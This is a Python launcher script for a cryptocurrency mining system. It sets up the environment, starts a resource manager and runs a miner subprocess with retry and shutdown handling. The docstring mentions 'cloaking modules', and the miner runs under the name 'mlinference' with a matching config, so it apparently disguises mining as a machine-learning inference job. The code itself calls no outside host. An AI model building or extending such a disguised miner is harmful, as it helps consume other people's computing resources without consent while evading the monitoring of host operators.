"""
start_mining.py

Main entrypoint to start the entire cryptocurrency mining system.
Performs environment setup, starts resource management and cloaking modules, and begins the mining process.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path

from mining_environment.scripts.logging_config import setup_logging

# Import Layer 1 modules: Mining Environment and resource optimization
from mining_environment.scripts import setup_env, system_manager

# Import Layer 2 to Layer 9 modules
# Assuming you have modules like layer2, layer3, ..., layer9
# import layer2  # noqa: E402
# import layer3  # noqa: E402
# ...
# import layer9  # noqa: E402

# Set path to logs directory
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# Setup logging with logging_config.py
logger = setup_logging(
    'start_mining',
    Path(LOGS_DIR) / 'start_mining.log',
    'INFO'
)

# Event for handling graceful shutdown
stop_event = threading.Event()

# Define events for synchronization between script parts
mining_started_event = threading.Event()


def signal_handler(signum, frame):
    """
    Handle stop signals (SIGINT, SIGTERM).
    Mark the stop event so threads can gracefully shut down.
    """
    logger.info(
        f"Received stop signal ({signum}). Stopping mining system..."
    )
    stop_event.set()


# Register signal handlers right after defining the handler function
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def initialize_environment():
    """
    Set up mining environment by calling setup_env.py.
    """
    logger.info("Starting mining environment setup.")
    try:
        setup_env.setup()
        logger.info("Environment setup successful.")
    except Exception as e:
        logger.error(f"Error during environment setup: {e}")
        sys.exit(1)


def start_system_manager():
    """
    Start resource management by calling system_manager.py.
    """
    logger.info("Starting Resource Manager.")
    try:
        system_manager.start()
        logger.info("Resource Manager has been started.")
    except Exception as e:
        logger.error(f"Error starting Resource Manager: {e}")
        stop_event.set()
        try:
            system_manager.stop()
        except Exception as stop_error:
            logger.error(f"Error stopping Resource Manager after failure: {stop_error}")


def is_mining_process_running(mining_process):
    """
    Check if the mining process is running.

    Args:
        mining_process (subprocess.Popen): Mining process object.

    Returns:
        bool: True if running, False if not.
    """
    return mining_process and mining_process.poll() is None


def start_mining_process(retries=3, delay=5):
    """
    Start the mining process by calling mlinference with retry mechanism.

    Args:
        retries (int): Number of retry attempts if process start fails.
        delay (int): Wait time between retries (seconds).

    Returns:
        subprocess.Popen or None: Mining process object or None if failed.
    """
    mining_command = os.getenv(
        'MINING_COMMAND',
        '/usr/local/bin/mlinference'
    )
    mining_config = os.path.join(
        os.getenv('CONFIG_DIR', '/app/mining_environment/config'),
        os.getenv('MINING_CONFIG', 'mlinference_config.json')
    )

    for attempt in range(1, retries + 1):
        logger.info(
            f"Attempting to start mining process (Attempt {attempt}/{retries})..."
        )
        try:
            mining_process = subprocess.Popen(
                [mining_command, '--config', mining_config]
            )
            logger.info(
                f"Mining process started with PID: {mining_process.pid}"
            )

            # Check if process is running
            time.sleep(2)  # Short wait for process to start
            if mining_process.poll() is not None:
                logger.error(
                    f"Mining process terminated immediately after start with return code: {mining_process.returncode}"
                )
                mining_process = None
            else:
                logger.info("Mining process is running.")
                mining_started_event.set()
                return mining_process
        except Exception as e:
            logger.error(f"Error starting mining process: {e}")
            mining_process = None

        if attempt < retries:
            logger.info(f"Waiting {delay} seconds before retrying...")
            time.sleep(delay)

    logger.error("All attempts to start mining process have failed.")
    stop_event.set()
    return None


def main():
    """
    Main function to start the entire mining system.
    """
    logger.info("===== Starting Cryptocurrency Mining Operation =====")

    # Step 1: Set up environment
    initialize_environment()

    # Step 2: Start mining in main thread with retry mechanism
    mining_process = start_mining_process(retries=3, delay=5)

    # Check mining process
    if not is_mining_process_running(mining_process):
        logger.error(
            "Mining process failed to start after multiple attempts. "
            "Stopping mining system."
        )
        stop_event.set()  # Ensure stop_event is triggered
        system_manager.stop()  # Call stop to halt resource management
        sys.exit(1)

    # Step 3: Start Resource Manager in separate thread
    resource_thread = threading.Thread(target=start_system_manager, daemon=True)
    try:
        resource_thread.start()
    except Exception as e:
        logger.error(f"Error starting Resource Manager: {e}")
        stop_event.set()
        system_manager.stop()
        sys.exit(1)

    # Wait for stop signal
    try:
        while not stop_event.is_set():
            if mining_process:
                retcode = mining_process.poll()
                if retcode is not None:
                    logger.warning(
                        f"Mining process has ended with return code: {retcode}. "
                        "Stopping mining system."
                    )
                    stop_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info(
            "Received KeyboardInterrupt. Stopping mining system..."
        )
        stop_event.set()
    finally:
        logger.info("Stopping mining components...")

        # Stop mining process if still running
        try:
            if mining_process and mining_process.poll() is None:
                mining_process.terminate()
                mining_process.wait(timeout=10)
                logger.info("Mining process has been stopped.")
        except Exception as e:
            logger.error(f"Error stopping mining process: {e}")

        # Stop Resource Manager
        try:
            system_manager.stop()
            logger.info("All resource managers have been stopped.")
        except Exception as e:
            logger.error(f"Error stopping resource managers: {e}")

        # Wait for thread to stop if not finished
        if resource_thread.is_alive():
            resource_thread.join(timeout=5)
            if resource_thread.is_alive():
                logger.error("Resource Manager thread could not be fully stopped.")

        logger.info("===== Cryptocurrency Mining Operation Successfully Stopped =====")


if __name__ == "__main__":
    main()
